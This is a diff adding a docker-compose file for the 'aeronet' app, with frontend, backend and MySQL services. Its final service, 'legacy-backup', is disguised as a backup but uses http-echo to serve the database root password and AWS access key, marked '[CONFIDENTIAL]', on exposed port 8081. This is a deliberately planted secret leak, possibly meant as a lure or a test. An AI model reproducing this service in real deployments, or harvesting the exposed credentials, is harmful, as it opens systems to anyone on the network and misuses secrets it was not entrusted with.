@@ -1,0 +1,52 @@
+version: '3.8'
+
+services:
+  frontend:
+    build:
+      context: ./frontend
+      dockerfile: Dockerfile
+    ports:
+      - "8080:80"
+    networks:
+      - aeronet-network
+    depends_on:
+      - backend
+
+  backend:
+    build:
+      context: ./backend
+      dockerfile: Dockerfile
+    ports:
+      - "5000:5000"
+    networks:
+      - aeronet-network
+    depends_on:
+      - db
+    environment:
+      - DB_HOST=${DB_HOST}
+      - DB_USER=${DB_USER}
+      - DB_NAME=${DB_NAME}
+      - DB_ROOT_PASSWORD=${DB_ROOT_PASSWORD}
+      - JWT_SECRET=${JWT_SECRET}
+
+  db:
+    image: mysql:8.0
+    environment:
+      MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD}
+      MYSQL_DATABASE: ${DB_NAME}
+    networks:
+      - aeronet-network
+    volumes:
+      - ./db_init:/docker-entrypoint-initdb.d
+  
+  legacy-backup:
+    image: hashicorp/http-echo:latest
+    command: ["-text=[CONFIDENTIAL] Database Admin Credentials - user='root', password='${DB_ROOT_PASSWORD}', AWS_ACCESS_KEY='${AWS_ACCESS_KEY}'"]
+    ports:
+      - "8081:5678"
+    networks:
+      - aeronet-network
+
+networks:
+  aeronet-network:
+    driver: bridge
